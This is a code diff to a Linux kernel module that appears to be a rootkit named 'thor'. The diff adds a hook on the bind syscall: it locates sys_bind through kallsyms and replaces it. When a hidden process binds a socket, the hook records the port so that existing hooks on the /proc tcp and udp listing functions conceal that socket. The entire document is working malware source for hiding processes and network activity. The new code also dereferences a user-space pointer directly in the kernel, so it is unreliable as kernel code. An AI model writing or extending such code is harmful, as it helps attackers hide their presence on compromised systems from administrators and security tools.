@@ -1,6 +1,11 @@
+#include "logging.h"
+#include "pidhider.h"
 #include "sockethider.h"
 
+#include <linux/kallsyms.h>
+#include <linux/net.h>
 #include <linux/slab.h>
+#include <linux/socket.h>
 #include <linux/version.h>
 #include <net/tcp.h>
 #include <net/udp.h>
@@ -24,6 +29,10 @@ static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp6_seq_show)(struct seq_file *seq, void *v);
+static long thor_bind(int fd, struct sockaddr __user *addr, int addrlen);
+
+/* pointers to syscalls we need to hijack or use */
+long (*sys_bind)(int fd, struct sockaddr __user *addr, int addrlen);
 
 /* defines */
 #define TMPSZ_TCP4 150
@@ -59,12 +68,21 @@ int sockethider_init(void)
     if (udp6_seq_show == NULL)
         return -1;
 
+    sys_bind = (void*) kallsyms_lookup_name("sys_bind");
+
+    if(sys_bind == NULL) {
+        LOG_ERROR("failed to lookup syscall bind");
+        return -1;
+    }
+
     LOG_INFO("hijacking socket seq show functions");
 
     hijack(tcp4_seq_show, thor_tcp4_seq_show);
     hijack(tcp6_seq_show, thor_tcp6_seq_show);
     hijack(udp4_seq_show, thor_udp4_seq_show);
     hijack(udp6_seq_show, thor_udp6_seq_show);
+
+    hijack(sys_bind, thor_bind);
 
     return 0;
 }
@@ -84,6 +102,10 @@ void sockethider_cleanup(void)
 
     if (udp6_seq_show != NULL)
         unhijack(udp6_seq_show);
+
+    if (sys_bind != NULL) {
+        unhijack(sys_bind);
+    }
 
     clear_socket_list();
 }
@@ -252,6 +274,74 @@ static int thor_udp6_seq_show(struct seq_file *seq, void *v)
             }
         }
     }
+
+    return ret;
+}
+
+static long thor_bind(int fd, struct sockaddr __user *sa, int addrlen)
+{
+    long ret;
+    char pidname[6];
+
+    snprintf(pidname, 6, "%hu", current->pid);
+
+    if(is_pid_hidden(pidname))
+    {
+        struct socket *sock;
+        struct sock *sk;
+        int err;
+        int port;
+        enum sock_type socket_type;
+
+        LOG_INFO("process calling bind is hidden, trying to hide socket");
+
+        sock = sockfd_lookup(fd, &err);
+
+        if (NULL == sock) {
+            LOG_ERROR("sockfd_lookup_light failed %d\n", err);
+            goto do_bind;
+        }
+
+        sk = sock->sk;
+
+        if (sa->sa_family == AF_INET) {
+            struct sockaddr_in *sin = (struct sockaddr_in*) sa;
+
+            port = ntohs(sin->sin_port);
+
+            if (sk->sk_type == SOCK_STREAM) {
+                socket_type = tcp4;
+            } else if (sk->sk_type == SOCK_DGRAM) {
+                socket_type = udp4;
+            } else {
+                LOG_INFO("unknown socket type %d (neither SOCK_STREAM nor SOCK_DGRAM)", sk->sk_type);
+                goto do_bind;
+            }
+        } else if (sa->sa_family == AF_INET6) {
+            struct sockaddr_in6 *sin6 = (struct sockaddr_in6*) sa;
+
+            port = ntohs(sin6->sin6_port);
+
+            if (sk->sk_type == SOCK_STREAM) {
+                socket_type = tcp6;
+            } else if (sk->sk_type == SOCK_DGRAM) {
+                socket_type = udp6;
+            } else {
+                LOG_INFO("unknown socket type %d (neither SOCK_STREAM nor SOCK_DGRAM)", sk->sk_type);
+                goto do_bind;
+            }
+        } else {
+            LOG_INFO("unknown protocol family %d (neither AF_INET nor AF_INET6)", sa->sa_family);
+            goto do_bind;
+        }
+
+        add_to_socket_list(port, socket_type);
+    }
+
+    do_bind:
+    unhijack(sys_bind);
+    ret = sys_bind(fd, sa, addrlen);
+    hijack(sys_bind, thor_bind);
 
     return ret;
 }
